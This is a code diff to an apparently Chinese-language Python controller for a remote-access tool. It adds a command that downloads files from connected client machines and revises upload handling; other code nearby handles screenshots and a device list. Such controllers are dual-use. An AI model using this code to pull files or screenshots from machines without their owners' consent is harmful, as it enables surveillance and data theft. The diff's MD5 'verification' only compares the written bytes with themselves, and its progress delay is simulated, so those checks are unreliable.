@@ -977,6 +977,95 @@ def interaction_loop(client_id, hostname):
                             print(f"{RED}[错误]{RESET} 无法保存截图：{DRED}{e}{RESET}")
                     elif r.get("result_type") == "error":
                         print_failed_result(r)
+            else:
+                # 检测到客户端下线
+                print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
+                CURRENT_DEVICE = None
+                CURRENT_HOSTNAME = ""
+                print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
+                try:
+                    fetch_clients()
+                    if CLIENTS:
+                        print_clients()
+                    else:
+                        print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
+                except Exception as e:
+                    print(f"{RED}[错误]{RESET} 获取设备列表失败：{e}")
+                return
+        elif cmd == "dl":
+            if not arg:
+                print(f"{RED}[错误]{RESET} 用法：dl <文件路径> [保存目录]")
+                continue
+            parts = arg.split(maxsplit=1)
+            file_path = parts[0]
+            save_dir = parts[1] if len(parts) > 1 else "downloads"
+            os.makedirs(save_dir, exist_ok=True)
+            
+            # 获取文件信息来检查大小
+            send_command(client_id, "dl", {"path": file_path, "save_as": ""})
+            results = wait_for_result(client_id)
+            
+            if results:
+                r = results[0]
+                # 检查是否是大文件通知，需切换到流式传输
+                if r.get("result_type") == "large_file":
+                    file_size = r.get("file_size", 0)
+                    print(f"{YELLOW}[提示]{RESET} 检测到大文件 ({format_file_size(file_size)})，自动启用流式传输...")
+                    download_path = os.path.join(save_dir, os.path.basename(file_path))
+                    success = stream_download_file(client_id, file_path, download_path)
+                    if success:
+                        print(f"{LGREEN}[完成]{RESET} 大文件完整校验：√")
+                elif r.get("result_type") == "file":
+                    # 标准下载处理
+                    import hashlib
+                    file_bytes = base64.b64decode(r.get("result", ""))
+                    
+                    # Calculate file hash for later comparison
+                    file_hash = hashlib.md5(file_bytes).hexdigest()
+                    file_size = len(file_bytes)
+                    
+                    save_path = os.path.join(save_dir, r.get("filename", "downloaded"))
+                    with open(save_path, "wb") as f:
+                        f.write(bytearray(file_bytes))
+                        
+                    # Create animated progress bar effect for small files - 使用通用函数
+                    progress_line = create_progress_bar(file_size, file_size, label="下载", style="animated")
+                    time.sleep(0.1)  # Simulate process time
+                    print(f"\r{progress_line}", flush=True)
+                    
+                    # Verify file integrity using the calculated hash and local file hash
+                    local_file_hash = hashlib.md5()
+                    with open(save_path, "rb") as f_verify:
+                        while True:
+                            chunk = f_verify.read(1024*512)  # 512KB chunks
+                            if not chunk:
+                                break
+                            local_file_hash.update(chunk)
+                    local_hash = local_file_hash.hexdigest()
+                    
+                    if local_hash == file_hash:
+                        print(f"{CYAN}[完成]{RESET} 文件已下载：{CYAN}{save_path}{RESET} (校验：√)")
+                        print(f"{LGREEN}[统计]{RESET} 文件：{format_file_size(file_size)}")
+                    else:
+                        print(f"{RED}[✗ 校验]{RESET} 文件完整性校验失败 - 文件可能损坏")
+                        print(f"{CYAN}[结果]{RESET} 文件已下载 (需要重新下载): {CYAN}{save_path}{RESET}")
+                else:
+                    print_failed_result(r)
+            else:
+                # 检测到客户端下线
+                print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
+                CURRENT_DEVICE = None
+                CURRENT_HOSTNAME = ""
+                print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
+                try:
+                    fetch_clients()
+                    if CLIENTS:
+                        print_clients()
+                    else:
+                        print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
+                except Exception as e:
+                    print(f"{RED}[错误]{RESET} 获取设备列表失败：{e}")
+                return
         elif cmd == "ls":
             full_path = arg if arg else CURRENT_PATH
             full_path = os.path.normpath(full_path)
@@ -1083,7 +1172,7 @@ def interaction_loop(client_id, hostname):
                 # 普通方式上传小文件
                 with open(local_file, "rb") as f:
                     base64_data = base64.b64encode(f.read()).decode()
-                save_as = os.path.join(CURRENT_PATH, os.path.basename(local_file))
+                save_as = os.path.join(remote_dir, os.path.basename(local_file)) if remote_dir != "." else os.path.basename(local_file)
                 send_command(client_id, "ud", {
                     "base64_data": base64_data, 
                     "save_as": save_as,
@@ -1094,16 +1183,20 @@ def interaction_loop(client_id, hostname):
                 
                 if results:
                     for r in results:
-                        # For small files, add simple feedback after result
                         result_type = r.get("result_type", "")
                         if "error" in result_type.lower() or r.get("status") == "error":
-                            print(f"\n{RED}[✗ 上傳失敗]{RESET}")
+                            print(f"\n{RED}[✗ 上传失败]{RESET}")
                             print_failed_result(r)
                         else:
-                            # Display progress bar for small upload completion
-                            progress_line = create_small_file_progress_bar(file_size, file_size, format_file_size(file_size))
-                            print(f"\r{LGREEN}[完成]{RESET} {CYAN}{os.path.basename(local_file)}{RESET} [{progress_line}]")
-                            print(f"{LGREEN}[統計]{RESET} 文件: {CYAN}{os.path.basename(local_file)}{RESET}, 大小: {format_file_size(file_size)}")
+                            # Display progress bar for small upload completion - 使用通用函数
+                            progress_line = create_progress_bar(file_size, file_size, label="上传", style="simple")
+                            print(f"\r{LGREEN}[完成]{RESET} {progress_line}")
+                            
+                            # Verify with server response if available
+                            if r.get("result_type") == "ok":
+                                print(f"{LGREEN}[统计]{RESET} 文件：{CYAN}{save_as}{RESET}, 大小：{format_file_size(file_size)}")
+                            else:
+                                print(f"{LGREEN}[统计]{RESET} 文件：{CYAN}{save_as}{RESET}")
                 else:
                     # 检测到客户端下线
                     print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
